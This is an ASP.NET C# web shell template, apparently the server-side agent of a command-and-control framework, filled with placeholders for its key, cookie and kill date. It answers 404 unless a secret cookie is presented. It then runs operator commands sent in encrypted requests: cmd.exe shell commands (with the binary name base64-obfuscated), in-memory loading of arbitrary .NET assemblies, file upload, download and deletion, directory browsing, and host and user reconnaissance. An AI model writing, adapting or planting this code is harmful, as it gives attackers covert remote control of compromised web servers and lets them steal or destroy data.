<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="Microsoft.Win32" %>

<script Language="C#" runat="server">
string Uuid = "%UUID%";
string Psk = "%AESPSK%";
string KillDate = "%KILLDATE%";

void Page_Load(object sender, EventArgs e) {
    if(Request.Cookies["%COOKIE%"] != null)
    {
        if (Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Uuid)) == Request.Cookies["%COOKIE%"].Value) 
        {
            if (CheckDate()) 
            {
                Response.Clear();
                Response.StatusCode = 404;
                Response.End();
            }
            else if (HttpContext.Current.Request.HttpMethod == "POST") 
            {
                System.IO.Stream str;
                Int32 counter, strLen, strRead;
                str = Request.InputStream;
                strLen = Convert.ToInt32(str.Length);
                byte[] strArr = new byte[strLen];
                strRead = str.Read(strArr, 0, strLen);
                string task;
                if (Psk != "") 
                {
                    task = Decrypt(System.Text.Encoding.UTF8.GetString(strArr, 0, strLen));
                }
                else 
                {
                    task = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(strArr, 0, strLen))).Substring(36);
                }      
                var tasking = task.Split('|');
                string response;
                switch (System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[1])))
                {
                    case "upload":
                        response = tasking[0] + "|" + Upload(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])), tasking[3]);
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "execute_assembly":
                        string[] args = new string[] { };
                        string cmdline = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2]));
                        if (cmdline.Length >= 1)
                        {
                            args = cmdline.Split();
                        }
                        else
                        {
                            args = new string[] { cmdline };
                        }
                        response = tasking[0] + "|" + ExecuteAssembly(args, tasking[3]);
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "shell":
                        response = tasking[0] + "|" + Shell(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "")
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "download":
                        response = tasking[0] + "|" + Download(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "")
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "checkin":
                        response = tasking[0] + "|" + CheckIn();
                        if (Psk != "")
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "pwd":
                        response = tasking[0] + "|" + CurrentDirectory();
                        if (Psk != "")
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "cd":
                        response = tasking[0] + "|" + ChangeDirectory(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "")
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "rm":
                        response = tasking[0] + "|" + RemoveFile(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "")
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "ls":
                        response = tasking[0] + "|" + ListDirectory(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "")
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    default:
                        break;
                }
            }
            else if (Request.QueryString["%PARAM%"] != null && Request.QueryString["%PARAM%"] != string.Empty) 
            {
                string task;
                if (Psk != "") 
                {
                    task = Decrypt(Request.QueryString["%PARAM%"]);
                }
                else 
                {
                    task = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Request.QueryString["%PARAM%"])).Substring(36);
                }
                var tasking = task.Split('|');
                string response;
                switch (System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[1])))
                {
                    case "shell":
                        response = tasking[0] + "|" + Shell(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "download":
                        response = tasking[0] + "|" + Download(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "checkin":
                        response = tasking[0] + "|" + CheckIn();
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "pwd":
                        response = tasking[0] + "|" + CurrentDirectory();
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "cd":
                        response = tasking[0] + "|" + ChangeDirectory(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "rm":
                        response = tasking[0] + "|" + RemoveFile(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    case "ls":
                        response = tasking[0] + "|" + ListDirectory(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tasking[2])));
                        if (Psk != "") 
                        {
                            task_response.Text = Encrypt(response);
                        }
                        else 
                        {
                            task_response.Text = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(response));
                        }
                        break;
                    default:
                        break;
                }
            }
        }
    }
    else 
    {
        Response.Clear();
        Response.StatusCode = 404;
        Response.End();
    }
}

bool CheckDate()
{
    DateTime kill = DateTime.Parse(KillDate);
    DateTime date = DateTime.Today;
    if (DateTime.Compare(kill, date) >= 0)
    {
        return false;
    }

    else
    {
        return true;
    }
}

string Shell(string cmdline) {
    string fds = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("Y21kLmV4ZQ=="));
    ProcessStartInfo process = new ProcessStartInfo();
    process.FileName = fds;
    process.Arguments = "/c" + cmdline;
    process.RedirectStandardOutput = true;
    process.UseShellExecute = false;
    process.CreateNoWindow = true;
    process.RedirectStandardOutput = true;
    process.RedirectStandardError = true;
    Process run = Process.Start(process);
    StreamReader stdout = run.StandardOutput;
    StreamReader stderr = run.StandardError;
    string result = stdout.ReadToEnd();
    result += stderr.ReadToEnd();
    stdout.Close();
    stderr.Close();
    return result;
}

string ExecuteAssembly(string[] args, string B64Assembly)
{
    try
    {
        string output = "";
        var a = Assembly.Load(Convert.FromBase64String(B64Assembly));
        MethodInfo entrypoint = a.EntryPoint;
        object[] arg = new object[] { args };
        TextWriter realStdOut = Console.Out;
        TextWriter realStdErr = Console.Error;
        TextWriter stdOutWriter = new StringWriter();
        TextWriter stdErrWriter = new StringWriter();
        Console.SetOut(stdOutWriter);
        Console.SetError(stdErrWriter);
        entrypoint.Invoke(null, arg);
        Console.Out.Flush();
        Console.Error.Flush();
        Console.SetOut(realStdOut);
        Console.SetError(realStdErr);
        output = stdOutWriter.ToString();
        output += stdErrWriter.ToString();
        return output;
    }
    catch (Exception ex) 
    {
       return "Error: " + ex.Message.ToString();
    }
}

string CheckIn()
{
    string info = String.Format("{0}|{1}|{2}|{3}|{4}|{5}|{6}", GetIPAddress(), Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", ""), Environment.UserName.ToString(), Environment.MachineName.ToString(), Environment.UserDomainName.ToString(), Process.GetCurrentProcess().Id, GetArch());
    return info;
}

string GetArch()
{
    string arch = "";
    if (IntPtr.Size == 8)
    {
        arch = "x64";
    }
    else
    {
        arch = "x86";
    }
    return arch;
}

string GetIPAddress()
{
    IPHostEntry Host = default(IPHostEntry);
    string Hostname = null;
    Hostname = System.Environment.MachineName;
    Host = Dns.GetHostEntry(Hostname);
    string ip = "";
    foreach (IPAddress IP in Host.AddressList)
    {
        if (IP.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
        {
            ip = Convert.ToString(IP);
        }
    }
    return ip;
}

string Upload(string path, string file) 
{
    if(!File.Exists(path))
        try 
        {
            File.WriteAllBytes(path, Convert.FromBase64String(file));
            return "File successfully uploaded";
        }
        catch (Exception ex) 
        {
            return "ERROR: " + ex.Message.ToString();
        }
    else 
    {
        return "File already exist";
    }
}

string Download(string path) 
{
    if (File.Exists(path))
        try 
        {
            return Convert.ToBase64String(File.ReadAllBytes(path));
        } 
        catch (Exception ex) 
        {
            return "Error: " + ex.Message.ToString();
        }
    else {
        return "File not found";
    }
}

string CurrentDirectory()
{
    return Directory.GetCurrentDirectory();
}

string ChangeDirectory(string path) 
{
    if (Directory.Exists(path)) 
    {
        try{
            Directory.SetCurrentDirectory(path);
            return "New current directory: " + Directory.GetCurrentDirectory();
        }catch(Exception ex){
            return "Error: " + ex.Message.ToString();
        }
    }
    else 
    {
        return "Error: Directory does not exist";
    }
}

string RemoveFile(string file) 
{
    try{
        if (File.Exists(file))
        {
            File.Delete(file);
            if (File.Exists(file))
            {
                return "Error: Could not delete file";
            }
            else
            {
                return "Successfully deleted file";
            }
        }
        else
        {
            return "Error: File does not exist";
        }
    }catch(Exception ex){
        return "Error: " + ex.Message.ToString();
    }

}

string ListDirectory(string path) 
{
    try{
        string result;
        if (path == "")
        {
            path = ".";
        }
        if (Directory.Exists(path))
        {
            result = DirectoryListing(path);
            return result;
        }
        else if (File.Exists(path))
        {
            result = DirectoryListing(path);
            return result;
        }
        else
        {
            return "Error: file or directory does not exist";
        }
    }catch(Exception ex){
        return "Error: " + ex.Message.ToString();
    }
}

string DirectoryListing(string Path)
{
    try{
        string result = "Directory\tSize\t\tTimestamp\t\tFilename\n";
        if (File.Exists(Path))
        {
            FileInfo fileInfo = new FileInfo(Path);
            if (fileInfo.Length < 9999)
            {
                result += String.Format("false\t\t{0}\t\t{1}\t{2}\n", fileInfo.Length.ToString(), fileInfo.LastWriteTimeUtc.ToString(), fileInfo.FullName);
            }
            else
            {
                result += String.Format("false\t\t{0}\t{1}\t{2}\n", fileInfo.Length.ToString(), fileInfo.LastWriteTimeUtc.ToString(), fileInfo.FullName);
            }
        }
        else
        {
            foreach (string dir in Directory.GetDirectories(Path))
            {
                DirectoryInfo dirInfo = new DirectoryInfo(dir);
                result += String.Format("true\t\t0\t\t{0}\t{1}\n", dirInfo.LastWriteTimeUtc.ToString(), dirInfo.FullName);
            }
            foreach (string file in Directory.GetFiles(Path))
            {
                FileInfo fileInfo = new FileInfo(file);
                if (fileInfo.Length < 9999)
                {
                    result += String.Format("false\t\t{0}\t\t{1}\t{2}\n", fileInfo.Length.ToString(), fileInfo.LastWriteTimeUtc.ToString(), fileInfo.FullName);
                }
                else
                {
                    result += String.Format("false\t\t{0}\t{1}\t{2}\n", fileInfo.Length.ToString(), fileInfo.LastWriteTimeUtc.ToString(), fileInfo.FullName);
                }
            }
        }
        return result;
    }catch(Exception ex){
        return "Error: " + ex.Message.ToString();
    }
}

string Encrypt(string plaintext)
{
    using (Aes aes = Aes.Create())
    {
        aes.Key = Convert.FromBase64String(Psk);
        aes.Padding = PaddingMode.PKCS7;
        ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

        using (MemoryStream encryptMemStream = new MemoryStream())
        using (CryptoStream encryptCryptoStream = new CryptoStream(encryptMemStream, encryptor, CryptoStreamMode.Write))
        {
            using (StreamWriter encryptStreamWriter = new StreamWriter(encryptCryptoStream))
            encryptStreamWriter.Write(plaintext);
            byte[] encrypted = aes.IV.Concat(encryptMemStream.ToArray()).ToArray();
            HMACSHA256 sha256 = new HMACSHA256(Convert.FromBase64String(Psk));
            byte[] hmac = sha256.ComputeHash(encrypted);
            byte[] final = encrypted.Concat(hmac).ToArray();
            return Convert.ToBase64String(final);
        }
    }
}

string Decrypt(string encrypted)
{

    byte[] input = Convert.FromBase64String(encrypted);
    byte[] IV = new byte[16];
    Array.Copy(input, 36, IV, 0, 16);
    byte[] ciphertext = new byte[input.Length - 16 - 32 - 36];
    Array.Copy(input, 16 + 36, ciphertext, 0, ciphertext.Length);
    HMACSHA256 sha256 = new HMACSHA256(Convert.FromBase64String(Psk));
    byte[] hmac = new byte[32];
    Array.Copy(input, 16 + 36 + ciphertext.Length, hmac, 0, 32);
    if (Convert.ToBase64String(hmac) == Convert.ToBase64String(sha256.ComputeHash(IV.Concat(ciphertext).ToArray())))
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = Convert.FromBase64String(Psk);
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, IV);
            using (MemoryStream decryptMemStream = new MemoryStream(ciphertext))
            using (CryptoStream decryptCryptoStream = new CryptoStream(decryptMemStream, decryptor, CryptoStreamMode.Read))
            using (StreamReader decryptStreamReader = new StreamReader(decryptCryptoStream))
            {
                return decryptStreamReader.ReadToEnd();
            }
        }
    }
    else
    {
        return "";
    }
}

</script>
<asp:Label ID="task_response" runat="server"></asp:Label>




